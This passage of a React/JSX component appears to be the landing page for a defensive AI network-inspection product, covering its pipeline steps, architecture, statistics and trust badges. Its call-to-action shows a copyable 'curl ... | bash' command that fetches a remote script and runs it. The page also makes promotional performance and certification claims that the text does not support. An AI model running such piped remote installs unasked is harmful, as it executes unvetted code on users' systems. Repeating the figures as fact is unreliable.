                <span className="text-[#70ffe3] font-bold">WORM VERIFIED</span>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* HOW IT WORKS: HORIZONTAL STEP PIPELINE */}
      <section className="w-full py-16 bg-[#0a0e17] border-t border-white/5">
        <div className="w-full max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col gap-8">
          <div className="text-center max-w-2xl mx-auto">
            <span className="font-mono text-[10px] tracking-wider text-[#70ffe3] uppercase font-semibold">
              DEFENSE IN DEPTH
            </span>
            <h2 className="font-sans font-semibold text-2xl sm:text-3xl text-[#dfe2ef] mt-1">
              Autonomous Neural Interception Pipeline
            </h2>
            <p className="font-sans text-sm text-[#b9cac5] mt-2">
              Packets are decrypted, inspected, classified, and forwarded in fewer than 1.4 milliseconds.
            </p>
          </div>

          {/* Steps Flow */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 relative">
            {/* Step 1 */}
            <div className="rounded-xl bg-[#181b25] border border-white/5 p-5 flex flex-col justify-between group hover:border-[#00e5c7]/40 transition-all">
              <div className="flex flex-col gap-3">
                <div className="flex items-center justify-between">
                  <span className="font-mono text-sm text-[#70ffe3] font-bold">STEP 01</span>
                  <span className="material-symbols-outlined text-[#00e5c7] text-[20px]">input</span>
                </div>
                <h4 className="font-sans font-semibold text-sm text-[#dfe2ef]">
                  Ingress / Egress Intercept
                </h4>
                <p className="font-sans text-xs text-[#b9cac5] leading-relaxed">
                  Network edge, Envoy gateways, and endpoint agents tap streaming TCP and HTTP/3 payload
                  frames with zero packet re-routing overhead.
                </p>
              </div>
              <div className="mt-4 pt-3 border-t border-white/5 font-mono text-[11px] text-[#70ffe3] flex items-center gap-1 font-semibold">
                <span>•</span> <span>eBPF kernel probes</span>
              </div>
            </div>

            {/* Step 2 */}
            <div className="rounded-xl bg-[#181b25] border border-white/5 p-5 flex flex-col justify-between group hover:border-[#00e5c7]/40 transition-all">
              <div className="flex flex-col gap-3">
                <div className="flex items-center justify-between">
                  <span className="font-mono text-sm text-[#70ffe3] font-bold">STEP 02</span>
                  <span className="material-symbols-outlined text-[#00e5c7] text-[20px]">memory</span>
                </div>
                <h4 className="font-sans font-semibold text-sm text-[#dfe2ef]">
                  Neural Detection Layer
                </h4>
                <p className="font-sans text-xs text-[#b9cac5] leading-relaxed">
                  Sub-millisecond semantic analysis, regex verification, entropy testing, and token
                  entropy algorithms deconstruct payloads simultaneously.
                </p>
              </div>
              <div className="mt-4 pt-3 border-t border-white/5 font-mono text-[11px] text-[#70ffe3] flex items-center gap-1 font-semibold">
                <span>•</span> <span>1.2ms execution window</span>
              </div>
            </div>

            {/* Step 3 */}
            <div className="rounded-xl bg-[#181b25] border border-white/5 p-5 flex flex-col justify-between group hover:border-[#00e5c7]/40 transition-all">
              <div className="flex flex-col gap-3">
                <div className="flex items-center justify-between">
                  <span className="font-mono text-sm text-[#70ffe3] font-bold">STEP 03</span>
                  <span className="material-symbols-outlined text-[#00e5c7] text-[20px]">gavel</span>
                </div>
                <h4 className="font-sans font-semibold text-sm text-[#dfe2ef]">
                  Policy &amp; Decision Engine
                </h4>
                <p className="font-sans text-xs text-[#b9cac5] leading-relaxed">
                  Zero-trust policy arbiter resolves access permissions against GDPR, HIPAA, and
                  internal corporate secrets matrices in micro-timings.
                </p>
              </div>
              <div className="mt-4 pt-3 border-t border-white/5 font-mono text-[11px] text-[#70ffe3] flex items-center gap-1 font-semibold">
                <span>•</span> <span>Zero-drift arbitration</span>
              </div>
            </div>

            {/* Step 4 */}
            <div className="rounded-xl bg-[#181b25] border border-white/5 p-5 flex flex-col justify-between group hover:border-[#00e5c7]/40 transition-all">
              <div className="flex flex-col gap-3">
                <div className="flex items-center justify-between">
                  <span className="font-mono text-sm text-[#70ffe3] font-bold">STEP 04</span>
                  <span className="material-symbols-outlined text-[#00e5c7] text-[20px]">
                    verified
                  </span>
                </div>
                <h4 className="font-sans font-semibold text-sm text-[#dfe2ef]">
                  Immutable Enforcement
                </h4>
                <p className="font-sans text-xs text-[#b9cac5] leading-relaxed">
                  Real-time allow/block execution is dispatched. Audit cryptograms are asynchronously
                  committed to hardware secure enclaves.
                </p>
              </div>
              <div className="mt-4 pt-3 border-t border-white/5 font-mono text-[11px] text-[#70ffe3] flex items-center gap-1 font-semibold">
                <span>•</span> <span>Zero packet leakage</span>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ARCHITECTURE PIPELINE DIAGRAM SECTION */}
      <section className="w-full py-16 bg-[#181b25]/30 border-t border-white/5" id="pipeline-architecture">
        <div className="w-full max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col gap-8">
          <div className="flex flex-col md:flex-row md:items-end justify-between gap-4">
            <div>
              <span className="font-mono text-[10px] tracking-wider text-[#70ffe3] uppercase font-semibold">
                ZERO EGRESS TOPOLOGY
              </span>
              <h2 className="font-sans font-semibold text-2xl sm:text-3xl text-[#dfe2ef] mt-1">
                Hybrid Edge &amp; Air-Gapped Topology
              </h2>
              <p className="font-sans text-sm text-[#b9cac5]">
                Operate completely on-premises with hardware-isolated neural acceleration or across
                global cloud edges.
              </p>
            </div>
            <div className="flex items-center gap-1.5 font-mono text-xs text-[#70ffe3] font-semibold">
              <span className="material-symbols-outlined text-[16px]">verified_user</span>
              <span>AIR-GAP READY // ZERO TELEMETRY CALL-HOME</span>
            </div>
          </div>

          {/* Architecture Flow Visual */}
          <div className="p-6 rounded-xl bg-[#0a0e17] border border-white/10 shadow-2xl flex flex-col gap-6">
            <div className="grid grid-cols-1 md:grid-cols-5 gap-4 items-center text-center">
              {/* Flow Node 1 */}
              <div className="p-4 rounded bg-[#181b25] border border-white/5 flex flex-col items-center gap-1">
                <span className="material-symbols-outlined text-[#70ffe3] text-[28px]">router</span>
                <span className="font-sans font-semibold text-sm text-[#dfe2ef]">Edge Proxy</span>
                <span className="font-mono text-xs text-[#b9cac5]">eBPF + Envoy Sink</span>
                <span className="font-mono text-[10px] text-[#70ffe3] px-2 py-0.5 bg-[#1c1f29] rounded border border-white/5 mt-1 font-semibold">
                  &lt; 0.2ms
                </span>
              </div>

              {/* Flow Arrow */}
              <div className="hidden md:flex flex-col items-center text-[#00e5c7]">
                <span className="font-mono text-[10px] tracking-wider text-[#b9cac5] font-semibold">
                  TLS TERMINATION
                </span>
                <span className="material-symbols-outlined text-[24px]">arrow_forward</span>
              </div>

              {/* Flow Node 2 */}
              <div className="p-4 rounded bg-[#181b25] border border-white/5 flex flex-col items-center gap-1">
                <span className="material-symbols-outlined text-[#70ffe3] text-[28px]">token</span>
                <span className="font-sans font-semibold text-sm text-[#dfe2ef]">
                  Neural Tokenizer
                </span>
                <span className="font-mono text-xs text-[#b9cac5]">TensorRT / ONNX</span>
                <span className="font-mono text-[10px] text-[#70ffe3] px-2 py-0.5 bg-[#1c1f29] rounded border border-white/5 mt-1 font-semibold">
                  &lt; 0.6ms
                </span>
              </div>

              {/* Flow Arrow */}
              <div className="hidden md:flex flex-col items-center text-[#00e5c7]">
                <span className="font-mono text-[10px] tracking-wider text-[#b9cac5] font-semibold">
                  PARALLEL HEURISTIC
                </span>
                <span className="material-symbols-outlined text-[24px]">arrow_forward</span>
              </div>

              {/* Flow Node 3 */}
              <div className="p-4 rounded bg-[#181b25] border border-white/5 flex flex-col items-center gap-1">
                <span className="material-symbols-outlined text-[#70ffe3] text-[28px]">balance</span>
                <span className="font-sans font-semibold text-sm text-[#dfe2ef]">
                  Policy Arbiter
                </span>
                <span className="font-mono text-xs text-[#b9cac5]">Zero-Trust Evaluator</span>
                <span className="font-mono text-[10px] text-[#70ffe3] px-2 py-0.5 bg-[#1c1f29] rounded border border-white/5 mt-1 font-semibold">
                  &lt; 0.4ms
                </span>
              </div>
            </div>

            {/* Architectural Highlights Footer */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-4 bg-[#181b25]/50 p-4 rounded border border-white/5">
              <div className="flex items-start gap-3">
                <span className="material-symbols-outlined text-[#70ffe3] text-[22px] mt-0.5">
                  lock_reset
                </span>
                <div>
                  <h5 className="font-sans font-semibold text-sm text-[#dfe2ef]">
                    Zero Data Retention Guarantee
                  </h5>
                  <p className="font-sans text-xs text-[#b9cac5] mt-1 leading-relaxed">
                    Payloads exist exclusively in volatile registers. Unpacked payload memory
                    addresses are zeroed with post-quantum random fills upon inspection termination.
                  </p>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <span className="material-symbols-outlined text-[#70ffe3] text-[22px] mt-0.5">
                  dns
                </span>
                <div>
                  <h5 className="font-sans font-semibold text-sm text-[#dfe2ef]">
                    Air-Gapped Neural Models
                  </h5>
                  <p className="font-sans text-xs text-[#b9cac5] mt-1 leading-relaxed">
                    Deploy models to classified, SCIF, or offline federal enclaves with identical
                    zero-shot detection capability and zero phone-home dependencies.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* STATS & SECURITY TRUST HIGHLIGHTS */}
      <section className="w-full py-16 border-t border-white/5">
        <div className="w-full max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col gap-8">
          {/* 4 High-Impact Numbers */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
            <div className="p-6 rounded-xl bg-[#181b25] border border-white/5 flex flex-col">
              <span className="font-sans text-3xl sm:text-4xl font-bold text-[#70ffe3] tracking-tight">
                14.2M
              </span>
              <span className="font-sans font-semibold text-sm text-[#dfe2ef] mt-1">
                Threats Neutralized
              </span>
              <span className="font-sans text-xs text-[#b9cac5] mt-0.5">
                Daily across 8,400 enterprise nodes
              </span>
            </div>

            <div className="p-6 rounded-xl bg-[#181b25] border border-white/5 flex flex-col">
              <span className="font-sans text-3xl sm:text-4xl font-bold text-[#41fcdd] tracking-tight">
                1.2ms
              </span>
              <span className="font-sans font-semibold text-sm text-[#dfe2ef] mt-1">
                Median Scan Overhead
              </span>
              <span className="font-sans text-xs text-[#b9cac5] mt-0.5">
                Zero perceptible egress latency
              </span>
            </div>

            <div className="p-6 rounded-xl bg-[#181b25] border border-white/5 flex flex-col">
              <span className="font-sans text-3xl sm:text-4xl font-bold text-[#dfe2ef] tracking-tight">
                0
              </span>
              <span className="font-sans font-semibold text-sm text-[#dfe2ef] mt-1">
                Leaked Production Secrets
              </span>
              <span className="font-sans text-xs text-[#b9cac5] mt-0.5">
                Zero breaches across active clients
              </span>
            </div>

            <div className="p-6 rounded-xl bg-[#181b25] border border-white/5 flex flex-col">
              <span className="font-sans text-3xl sm:text-4xl font-bold text-[#70ffe3] tracking-tight">
                99.99%
              </span>
              <span className="font-sans font-semibold text-sm text-[#dfe2ef] mt-1">SLA Uptime</span>
              <span className="font-sans text-xs text-[#b9cac5] mt-0.5">
                Multi-region active-active clusters
              </span>
            </div>
          </div>

          {/* Trust Grid */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
            <div className="p-4 rounded bg-[#1c1f29] border border-white/5 flex items-center gap-3">
              <span className="material-symbols-outlined text-[#70ffe3] text-[24px]">verified</span>
              <div>
                <h5 className="font-sans font-semibold text-sm text-[#dfe2ef]">
                  No Rogue Remediation
                </h5>
                <p className="font-sans text-xs text-[#b9cac5]">
                  Every block strictly policy-governed.
                </p>
              </div>
            </div>

            <div className="p-4 rounded bg-[#1c1f29] border border-white/5 flex items-center gap-3">
              <span className="material-symbols-outlined text-[#70ffe3] text-[24px]">security</span>
              <div>
                <h5 className="font-sans font-semibold text-sm text-[#dfe2ef]">
                  Zero-Egress Isolation
                </h5>
                <p className="font-sans text-xs text-[#b9cac5]">Data never trains public models.</p>
              </div>
            </div>

            <div className="p-4 rounded bg-[#1c1f29] border border-white/5 flex items-center gap-3">
              <span className="material-symbols-outlined text-[#70ffe3] text-[24px]">
                workspace_premium
              </span>
              <div>
                <h5 className="font-sans font-semibold text-sm text-[#dfe2ef]">
                  SOC 2 Type II Certified
                </h5>
                <p className="font-sans text-xs text-[#b9cac5]">
                  ISO 27001 &amp; FedRAMP Moderate Ready.
                </p>
              </div>
            </div>

            <div className="p-4 rounded bg-[#1c1f29] border border-white/5 flex items-center gap-3">
              <span className="material-symbols-outlined text-[#70ffe3] text-[24px]">
                developer_board
              </span>
              <div>
                <h5 className="font-sans font-semibold text-sm text-[#dfe2ef]">
                  On-Device Inference
                </h5>
                <p className="font-sans text-xs text-[#b9cac5]">
                  Offline SCIF support out-of-the-box.
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* FINAL CONVERSION CTA SECTION */}
      <section className="w-full py-16 pb-20 border-t border-white/5">
        <div className="w-full max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="rounded-xl bg-[#181b25] border border-white/10 p-8 sm:p-12 flex flex-col items-center text-center relative overflow-hidden shadow-2xl">
            {/* Accent Glow background */}
            <div className="absolute -bottom-24 left-1/2 -translate-x-1/2 w-[500px] h-[250px] bg-[#00e5c7]/10 blur-[100px] rounded-full pointer-events-none"></div>

            <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#0a0e17] text-[#70ffe3] border border-white/10 mb-4 font-mono text-[10px] tracking-wider uppercase font-semibold">
              <span className="material-symbols-outlined text-[16px]">bolt</span>
              <span>RAPID SEC-OPS DEPLOYMENT</span>
            </div>

            <h2 className="font-sans font-semibold text-2xl sm:text-3xl text-[#dfe2ef] max-w-2xl">
              Deploy Defensive AI in Under 5 Minutes.
            </h2>
            <p className="font-sans text-sm text-[#b9cac5] max-w-xl mt-2 mb-6 leading-relaxed">
              Zero agents required for network egress enforcement. Instant Helm charts for Kubernetes,
              Terraform providers for AWS/GCP, and unified CLI daemons.
            </p>

            {/* Command Box with One-Click Copy */}
            <div className="w-full max-w-xl flex items-center justify-between bg-[#0a0e17] px-4 py-2.5 rounded border border-white/10 mb-6">
              <div className="flex items-center gap-2 text-left truncate mr-2 font-mono text-xs">
                <span className="text-[#00e5c7] font-bold">$</span>
                <span className="text-[#dfe2ef] truncate">curl -sSL https://get.threatlens.io | bash</span>
              </div>
              <button
                onClick={handleCopyCmd}
                className="flex items-center gap-1.5 px-3 py-1 rounded bg-[#1c1f29] hover:bg-[#262a34] text-[#70ffe3] font-mono text-xs transition-all border border-white/5 cursor-pointer shrink-0"
              >
                <span className="material-symbols-outlined text-[15px]">
                  {copiedCmd ? 'check' : 'content_copy'}
                </span>
                <span>{copiedCmd ? 'Copied!' : 'Copy'}</span>
              </button>
            </div>

            {/* Conversion Buttons */}
            <div className="flex flex-wrap items-center justify-center gap-4">
              <button
                onClick={onOpenScheduleModal}
                className="flex items-center gap-2 px-6 py-3 rounded bg-[#00e5c7] text-[#00382f] font-sans font-bold text-sm shadow-[0_0_20px_rgba(0,229,199,0.35)] hover:shadow-[0_0_28px_rgba(0,229,199,0.5)] hover:bg-[#70ffe3] transition-all cursor-pointer"
              >
                <span className="material-symbols-outlined text-[18px]">calendar_month</span>
                <span>Schedule Enterprise SOC Briefing</span>
              </button>
              <button
                onClick={onOpenApiModal}
                className="flex items-center gap-2 px-6 py-3 rounded bg-[#262a34] text-[#70ffe3] font-sans font-semibold text-sm hover:bg-[#31353f] border border-white/10 transition-all cursor-pointer"
              >
                <span className="material-symbols-outlined text-[18px]">key</span>
                <span>Request API Access</span>
              </button>
            </div>
          </div>
        </div>
      </section>
    </div>
  );
};
